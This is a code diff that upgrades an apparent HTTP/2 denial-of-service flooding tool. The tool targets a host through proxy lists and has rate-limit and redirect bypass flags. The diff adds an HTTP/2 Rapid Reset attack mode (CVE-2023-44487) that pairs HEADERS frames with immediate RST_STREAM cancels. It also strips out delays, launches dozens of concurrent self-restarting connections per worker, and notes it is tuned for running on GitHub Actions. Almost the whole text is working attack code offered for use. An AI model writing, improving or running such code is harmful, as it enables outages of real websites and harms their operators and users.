@@ -107,6 +107,13 @@ const enableRatelimitBypass = ratelimitBypassIndex !== -1;
 const redirectBypassIndex = process.argv.indexOf('--redirect-bypass');
 const enableRedirectBypass = redirectBypassIndex !== -1;
 
+// === OPTIMIZED FLAGS (GitHub Actions) ===
+const rapidResetMode = process.argv.includes('--rapid-reset');
+const multiConnMode = !process.argv.includes('--single-conn');
+// Number of concurrent connections per cluster worker
+// With ratelimit=512 -> CONCURRENT=32 connections per worker
+const CONCURRENT_CONNS = Math.max(8, Math.min(64, Math.ceil(ratelimit / 16)));
+
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
     console.log(`
@@ -1390,16 +1397,35 @@ async function go() {
 
                         // SEND BATCH REQUESTS
                         if (requests.length > 0) {
-                            tlsSocket.write(Buffer.concat(requests), (err) => {
-                                if (err) {
-                                    tlsSocket.end(() => tlsSocket.destroy());
-                                    return;
+                            const batchBuf = Buffer.concat(requests);
+                            if (rapidResetMode) {
+                                // HTTP/2 Rapid Reset (CVE-2023-44487)
+                                // Send HEADERS then immediately RST_STREAM for each stream
+                                // Forces server to allocate+deallocate resources at max rate
+                                const rstFrames = [];
+                                let s = streamId - requests.length * 2;
+                                for (let ri = 0; ri < requests.length; ri++) {
+                                    rstFrames.push(encodeRstStream(s, 8)); // CANCEL
+                                    s += 2;
                                 }
-                            });
+                                tlsSocket.write(Buffer.concat([batchBuf, ...rstFrames]), (err) => {
+                                    if (err) {
+                                        tlsSocket.end(() => tlsSocket.destroy());
+                                        return;
+                                    }
+                                });
+                            } else {
+                                tlsSocket.write(batchBuf, (err) => {
+                                    if (err) {
+                                        tlsSocket.end(() => tlsSocket.destroy());
+                                        return;
+                                    }
+                                });
+                            }
                         }
                         
                         const elapsed = Date.now() - startTime;
-                        const batchDelay = Math.max(10, (100 / batchSize) - elapsed); 
+                        const batchDelay = rapidResetMode ? 0 : Math.max(2, (50 / batchSize) - elapsed); 
                         
                         if (batch < batchSize - 1) {
                             await sleep(batchDelay);
@@ -1407,8 +1433,12 @@ async function go() {
                     }
                     
 
-                    const nextDelay = Math.max(50, 300 / ratelimit); 
-                    setTimeout(() => main(), nextDelay);
+                    const nextDelay = rapidResetMode ? 0 : Math.max(5, 100 / ratelimit);
+                    if (nextDelay === 0) {
+                        setImmediate(() => main());
+                    } else {
+                        setTimeout(() => main(), nextDelay);
+                    }
                 }
                 main();
             }).on('error', () => {
@@ -1425,8 +1455,9 @@ async function go() {
         netSocket.write(connectRequest);
 
     }).once('error', () => { }).once('close', () => {
-        if (tlsSocket) {
-            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
+        // cleanup() handles restart - avoid double go()
+        if (tlsSocket && !tlsSocket.destroyed) {
+            try { tlsSocket.destroy(); } catch(e) {}
         }
     });
 
@@ -1439,16 +1470,16 @@ async function go() {
     });
     
     function cleanup(error) {
-            cleanupConnectionLifecycle(proxyHost);
-        if (error) {
-            setTimeout(go, getRandomInt(50, 200));
+        cleanupConnectionLifecycle(proxyHost);
+        if (netSocket && !netSocket.destroyed) {
+            try { netSocket.destroy(); } catch(e) {}
         }
-        if (netSocket) {
-            netSocket.destroy();
+        if (tlsSocket && !tlsSocket.destroyed) {
+            try { tlsSocket.destroy(); } catch(e) {}
         }
-        if (tlsSocket) {
-            tlsSocket.end();
-        }
+        // Always restart to maintain concurrent connection count
+        const restartDelay = error ? getRandomInt(50, 200) : getRandomInt(10, 50);
+        setTimeout(go, restartDelay);
     }
 }
 function handleQuery(query) {
@@ -1577,21 +1608,24 @@ if (cluster.isMaster) {
         setTimeout(() => process.exit(1), time * 1000);
     }
 } else {
-    if (connectFlag) {
-        setInterval(() => {
-            go();
-        }, delay);
+    // === OPTIMIZED: Launch CONCURRENT_CONNS parallel connections per worker ===
+    // Each connection self-restarts via cleanup() — maintains full concurrency
+    // With ratelimit=512 -> 32 connections per worker
+    // With threads=2 -> 2 workers * 32 = 64 concurrent H2 connections total
+    if (multiConnMode) {
+        for (let i = 0; i < CONCURRENT_CONNS; i++) {
+            setTimeout(() => go(), i * 15 + delay);
+        }
     } else {
-        let consssas = 0;
-        let someee = setInterval(() => {
-            if (consssas < 50000) {
-                consssas++;
-            } else {
-                clearInterval(someee);
-                return;
-            }
-            go();
-        }, delay);
+        // Legacy single-connection mode
+        if (connectFlag) {
+            setInterval(() => { go(); }, delay);
+        } else {
+            let c = 0;
+            let tmr = setInterval(() => {
+                if (c++ < 50000) { go(); } else { clearInterval(tmr); }
+            }, delay);
+        }
     }
     if (debugMode) {
         setInterval(() => {
